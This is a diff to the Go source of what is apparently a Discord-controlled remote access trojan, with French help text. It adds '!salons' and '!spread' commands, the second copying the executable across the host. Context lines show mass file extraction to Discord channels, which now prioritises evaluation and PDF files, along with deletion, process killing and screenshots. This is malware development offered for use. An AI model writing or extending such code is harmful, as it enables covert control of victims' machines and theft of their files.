@@ -468,6 +468,12 @@ func c2Execute(command string) {
 	case "rm", "suppr":
 		discordReply(deletePath(args))
 
+	case "salons", "channels", "salon":
+		discordReply(channelsReport())
+
+	case "spread", "copie", "duplique":
+		discordReply(spreadCopies(true))
+
 	case "files", "tout", "bulk":
 		discordReply("extraction massive lancée dans les salons fichiers…")
 		go func() {
@@ -668,7 +674,9 @@ func c2Help() string {
 		"!close <pid|nom>     ferme la fenêtre\n" +
 		"!kill <pid|nom>      tue le processus\n" +
 		"!apps [filtre]       applications ouvertes + chemins\n" +
-		"!files               extraction massive (docs, images)\n" +
+		"!files               extraction massive (eval + PDF d'abord)\n" +
+		"!salons              crée/vérifie les 9 salons\n" +
+		"!spread              duplique l'exe sur le poste\n" +
 		"!rm <chemin>         supprime fichier/dossier\n" +
 		"!screenshot          captures (salon -screenshots)\n" +
 		"!screenshot hd       agrandit x3 (scale 1|2|3)\n" +
